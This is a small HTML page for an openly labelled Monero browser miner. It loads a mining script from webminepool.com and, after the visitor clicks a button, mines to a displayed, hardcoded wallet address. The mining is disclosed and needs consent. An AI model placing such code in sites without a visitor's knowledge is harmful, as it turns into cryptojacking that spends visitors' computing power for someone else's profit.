
<!DOCTYPE html>
<html lang="en">
<head>

  <title>Monero WASM Miner</title>
  <style>
    body { background: #111; color: #fff; font-family: Arial; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
    button { margin: 10px; padding: 10px 20px; font-size: 16px; background: #333; color: white; border: none; cursor: pointer; }
  </style>
</head>
<body>
  <h1>Monero WASM Browser Miner</h1>
  <p>Mining to wallet:</p>
  <code>42e3e9JYxcwE9rYLZQsKGuXwUytE1mCPuLv6rRk3aQNF2qTLNSyjjMC8U3H7ZxTMGjX5SsGAmxyg799z6EkVwW4556VHo5y</code>
  <div id="status">Miner is idle</div>
  <button onclick="startMining()">Start Mining</button>
  <button onclick="stopMining()">Stop Mining</button>

  <script src="https://webminepool.com/lib/base.js"></script>
  <script>
    let miner;

    function startMining() {
      if (!miner) {
        miner = WMP.Anonymous('42e3e9JYxcwE9rYLZQsKGuXwUytE1mCPuLv6rRk3aQNF2qTLNSyjjMC8U3H7ZxTMGjX5SsGAmxyg799z6EkVwW4556VHo5y', 'worker1', { threads: 1, autoThreads: false });
      }
      miner.start();
      document.getElementById("status").innerText = "⛏️ Mining started...";
    }

    function stopMining() {
      if (miner) {
        miner.stop();
        document.getElementById("status").innerText = "⏹️ Mining stopped.";
      }
    }
  </script>
</body>
